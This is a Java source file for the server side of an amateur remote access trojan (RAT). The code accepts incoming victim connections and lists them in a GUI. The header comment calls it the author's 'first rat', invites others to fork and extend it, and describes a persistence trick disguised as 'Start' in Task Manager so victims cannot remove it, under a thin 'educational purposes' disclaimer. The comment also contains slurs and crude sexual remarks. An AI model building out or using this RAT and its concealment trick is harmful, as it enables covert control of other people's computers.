package me.sebsb;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import me.sebsb.gui.GuiMain;

/*
 * btw finals mom is a hotty
 * 
 * also someone tell me how to stop threads without it giving a warning. lol
 * 
 * also please fork this as im a retard.
 * ok bye
 * 
 * this is like my first open src program. so im putting lots of messages to make it easier to read I think.
 * 
 * ok I'm actually curious: do people like when open src programs have comments? I personally hate it. it makes the code impossible to comprehend.
 * but i cant comprehend code anyway so it doesn't matter.
 * subscribe to finals mom on facebook.
 * 
 * uhh don't make fun of me for my shitty coding, ik it looks like a 2 yo coded it. but idc cus this is my first rat and i had like no networking knowledge prior.
 * 
 * reasons on why u should fork my rat:
 * 1. I am a bad coder
 * 2. I am a lazy coder
 * 3. because u should give me more code
 * 4. idk
 * 5. im bad at coding
 * 
 * 
 * ok this is enough I think.
 * nvm
 * 
 * this rat is rly cool btw.
 * it has a gui,`
 * the gui looks like shit
 * but it still has a gui.
 * 
 * if someone knows how to make a good looking gui pls do it.
 * 
 * btw there are some features in this rat that I haven't been bothered to make a GUI for.
 * so if u would like to do that for me that would be nice.
 * 
 * lmk if u guys want more comments
 * btw this is only for educational purposes only.
 * 
 * dont rat people, its bad. 
 * I only wrote this program to learn how rats work.
 * and I'm proud to say I still don't know how they work.
 * 
 * if u guys like my undeletable exploit thing thats cool, but dont use it for malicous purposes.
 * also the exploited file appears in task manager startup as 'Start', so any retard trying to remove it won't know how.
 * the most common way retards remove it, is by editing the jar with notepad and deleting all the contents.
 * u can prevent this by just making a hidden folder.
 * as I said, idk if it works because im too lazy to test, but it might work.
 * 
 * ok, enough talk from me. bye
 */
public class Server {

	// list of clients
	private ArrayList<ConnectedClient> clients = new ArrayList<ConnectedClient>();
	// a server socket
	private ServerSocket ss;
	// instance of the class
	private static Server instance;
	
	// instance of the gui
	private GuiMain gui;
	// thread that looks for clients
	private Thread searchThread;
	
	public Server() throws IOException {
		gui = new GuiMain(this);
		// waits until the user has set the port
		while (gui.getPort() == -1) {
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		this.changePort(gui.getPort());
	}
	
	private int lastPort = -1;
	
	// changes the port
	public void changePort(int port) {
		if (lastPort == port) {
			return;
		}
		lastPort = port;
		if (searchThread != null && searchThread.isAlive()) {
			searchThread.stop();
		}
		
		if (ss != null && !ss.isClosed()) {
			try {
				ss.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		
		searchThread = new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					ss = new ServerSocket(port);
					while (true) {
						try {
							Socket s = ss.accept();
							clients.add(new ConnectedClient(s));
							gui.updateInfo();
						} catch (Exception e) {
							e.printStackTrace();
						} catch (ThreadDeath e2) {
							e2.printStackTrace();
						}
					}
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
		});
		searchThread.setName(port + "");
		searchThread.start();
	}
	
	// gets the gui
	public GuiMain getGUI() {
		return this.gui;
	}
	
	// removes a client
	public void removeClient(ConnectedClient client) {
		if (this.clients.contains(client)) {
			this.clients.remove(client);
			this.gui.updateInfo();
		}
	}
	
	// get the list of clients
	public ArrayList<ConnectedClient> getClients() {
		return this.clients;
	}
	
	// main function
	public static void main(String[] args) throws IOException {
		instance = new Server();
	}
	
	// get the instance of the server
	public static Server getInstance() {
		return instance;
	}
}
